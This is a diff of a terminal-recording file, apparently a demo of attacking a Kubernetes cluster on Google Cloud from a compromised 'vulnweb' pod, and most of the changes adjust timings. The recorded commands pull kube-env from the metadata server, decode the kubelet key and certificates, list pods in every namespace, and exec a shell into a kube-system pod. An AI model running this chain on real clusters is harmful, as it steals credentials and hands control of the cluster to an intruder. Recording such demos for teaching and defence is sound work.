@@ -15,11 +15,11 @@
       "\r\n\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-qgpg1:/# "
     ],
     [
-      1.0,
+      0.6,
       "curl -s -H \"X-Google-Metadata-Request: True\" http://metad \rata.google.internal/0.1/meta-data/attributes/"
     ],
     [
-      4.0,
+      0.4,
       "\r\n"
     ],
     [
@@ -39,7 +39,7 @@
       "curl -s -H \"X-Google-Metadata-Request: True\" http://metada\rata.google.internal/0.1/meta-data/attributes/"
     ],
     [
-      0.810749,
+      0.410749,
       "u"
     ],
     [
@@ -135,7 +135,7 @@
       "\b\u001b[K"
     ],
     [
-      0.298661,
+      0.198661,
       "k"
     ],
     [
@@ -155,7 +155,7 @@
       "-"
     ],
     [
-      0.190251,
+      0.090251,
       "e"
     ],
     [
@@ -343,7 +343,7 @@
       "\r\n\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-qgpg1:/# "
     ],
     [
-      1.0,
+      0.6,
       "curl -sLO https://storage.googleapis.com/kubernetes-relea \rse/release/$(curl -s https://storage.goo"
     ],
     [
@@ -363,15 +363,11 @@
       "e.txt) \r/bin/linux/amd64/kubectl && chmod +x kubectl && mv kubectl /usr/local/bin && curl -s -H \"X \r-Google-Metadata-Request: True\" http://metadata.google.internal/computeMetadata/v1/instanc \re/attributes/kube-env | sed -e 's/^/export /g' | sed -e 's/: /=/g' | grep -v \"EVICTION_HAR \rD\" | grep -v \"EXTRA_DOCKER_OPTS\" > kube-env.sh && . kube-env.sh && echo $KUBELET_KEY | bas \re64 -d > client.pem && echo $KUBELET_CERT | base64 -d > client.crt && echo $CA_CERT | base \r64 -d > ca.crt && kubectl --certificate-authority=ca.crt --client-key=client.pem --client- \rcertificate=client.crt --server https://$KUBERNETES_MASTER_NAME get pods --all-namespaces"
     ],
     [
-      5.980443,
+      3.080443,
       "\r\n"
     ],
     [
-      0.656478,
-      "bash: export: `--kube-reserved=cpu=60m,memory=960Mi': not a valid identifier\r\n"
-    ],
-    [
-      0.563764,
+      0.263764,
       "NAMESPACE     NAME                                                      READY     STATUS    RESTARTS   AGE\r\ndefault       auditcon-1212018461-0kh46                                 1/1       Running   0          29m\r\ndefault       azure-vote-back-4149398501-ltvt9                          1/1       Running   0          30m\r\ndefault       azure-vote-front-1874756303-lz5v9                         1/1       Running   0          30m\r\ndefault       vulnweb-2569941405-qgpg1                                  1/1       Running   0          30m\r\nkube-system   event-exporter-v0.1.7-958884745-gj59x                     2/2       Running   0          37m\r\nkube-system   fluentd-gcp-v2.0.9-3j8w5                                  2/2       Running   0          36m\r\nkube-system   fluentd-gcp-v2.0.9-kllnf                                  2/2       Running   0          36m\r\nkube-system   fluentd-gcp-v2.0.9-tv7wx                                  2/2       Running   0          36m\r\nkube-system   heapster-v1.4.3-2464227534-7t2hz      "
     ],
     [
@@ -587,7 +583,7 @@
       "root@vulnweb-2569941405-qgpg1:/# "
     ],
     [
-      2.0,
+      1.2,
       "kubectl --certificate-authority=ca.crt --client-key=clien \rt.pem --client-certificate=client.crt --server https://$"
     ],
     [
@@ -595,7 +591,7 @@
       "KUBERNETES_MASTER_NAME exec -it ng \rinx -n kube-system /bin/bash"
     ],
     [
-      0.457371,
+      1.457371,
       "\r\n"
     ],
     [
@@ -607,7 +603,7 @@
       "root@vulnweb-2569941405-qgpg1:/# "
     ],
     [
-      4.0,
+      3.0,
       "c"
     ],
     [
